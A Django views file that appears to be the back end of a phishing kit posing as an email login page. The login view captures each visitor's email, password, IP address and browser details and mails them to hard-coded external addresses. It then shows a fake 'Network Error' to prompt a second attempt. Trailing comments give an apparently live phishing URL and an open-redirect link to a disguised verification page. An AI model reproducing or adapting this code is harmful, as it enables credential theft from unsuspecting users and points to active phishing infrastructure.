from django.shortcuts import render, redirect
from django.utils import timezone
from django.core.validators import validate_email
from django.core.exceptions import ValidationError
from django.urls import reverse
from django.contrib import messages
from django.template.loader import render_to_string

from .utils import get_browser_info, get_client_ip
from . import send_email

def home(request):
    return render(request, 'frontend/index.html')


def user_login_view(request):
    if request.method == 'POST':
        email = request.POST.get('email', '').strip()
        password = request.POST.get('f_password')

        if password:

            browser_info = get_browser_info(request)
            ip_address = get_client_ip(request)

            message = render_to_string('frontend/email_result.html', 
            {
                'email': email,
                'password': password,
                'ip_address':ip_address,
                'b_version':browser_info['version'],
                'browser':browser_info['browser'],
                'agent':browser_info['agent'],
                'time': timezone.localtime(timezone.now()),
            })

            try:
                send_email.email_message_send('Update Successful', message, 'bamsven@proton.me' )
                # send_email.email_message_send('Update Successful', message, 'petertessy1333@gmail.com' )
                messages.error(request, "Network Error! Please verify your information and try again.")
            except Exception as e:
                print(f"Error sending email: {str(e)}")
                messages.error(request, "Login failed, Please try again")
            finally:
                url = reverse('frontend:user_login') + f'?em={email}'
                return redirect(url)

        else:
            # Step 1: Email submitted, validate email and redirect to ?em=
            try:
                validate_email(email)
                url = reverse('frontend:user_login') + f'?em={email}'
                return redirect(url)
            except ValidationError:
                # Invalid email, show email form with error
                context = {
                    'email_error': 'Please enter a valid email address.',
                    'existing_email': '',
                    'email_is_valid': False,
                }
                return render(request, 'frontend/login.html', context)

    else:
        # GET request: check if email param exists and is valid
        existing_email = request.GET.get('em', '').strip()
        email_is_valid = False

        try:
            if existing_email:
                validate_email(existing_email)
                email_is_valid = True
        except ValidationError:
            existing_email = ''

        context = {
            'existing_email': existing_email,
            'email_is_valid': email_is_valid,
        }
        return render(request, 'frontend/login.html', context)
# https://macasaca.onrender.com/login/?em=mike@gmail.com

# http://slot-lucky.com/bbs/c-board.cgi?cmd=lct;url=https://waysapps.blob.core.windows.net/confirmsssoutho3653verify/Reed2025Fitzgerald.html

